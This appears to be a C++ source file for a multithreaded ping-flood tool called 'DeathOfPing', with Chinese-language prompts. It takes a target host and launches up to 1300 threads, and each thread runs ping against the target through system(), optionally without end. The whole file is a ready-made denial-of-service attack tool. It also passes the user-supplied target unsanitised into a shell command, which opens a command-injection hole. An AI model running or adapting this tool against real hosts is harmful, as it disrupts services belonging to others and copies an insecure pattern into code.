
//
// Created by ubuntu-linux on 23-11-2.
//
#include "config.h"
#include "thread"

class DeathOfPing {
private:
    std::string target;
    int number = 0;
    bool isAlways = false;
    int thread = 0;
public:
    DeathOfPing() = default;

    void run_threads(int thread) {
        std::vector<std::thread> threads;
        for (int i = 0; i < thread; i++) {
            threads.emplace_back([this, i] { attack(i); });
        }
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void attack(int i) {
        string s = "ping -c "+ to_string(number) + " " + target;
        if (isAlways) {
            s = "ping " + target;
            system(s.c_str());
        }
        else {
            system(s.c_str());
        }
    }

    void Console() {

        target = input("输入目标主机: ");
        string n = input(
                "输入单个模拟用户发送的数据量 [输入 'max' 一直运行] : "
        );
        if (n == "max") {
            isAlways = true;
        }else {
            try {
                number = stoi(n);
            }catch (const runtime_error& error) {
                std::cout << "[ERR] 输入错误." << std::endl;
                return;
            }
        }
        try {
            thread = stoi(input("输入模拟用户数量: [1-1300] "));
            if (thread > 1300 || thread < 1)
            {
                std::cerr << "你的操作错误，停止操作.";
                return;
            }
        }catch (const runtime_error& error)
        {
            std::cout << "[ERR] 你的操作错误，停止操作." << std::endl;
            return;
        }
        try {
            cout << "\n" << endl;
            run_threads(thread);
        }catch (const runtime_error& error) {
            std::cout << "[ERR] runtime Error." << std::endl;
            return;
        }
    }
};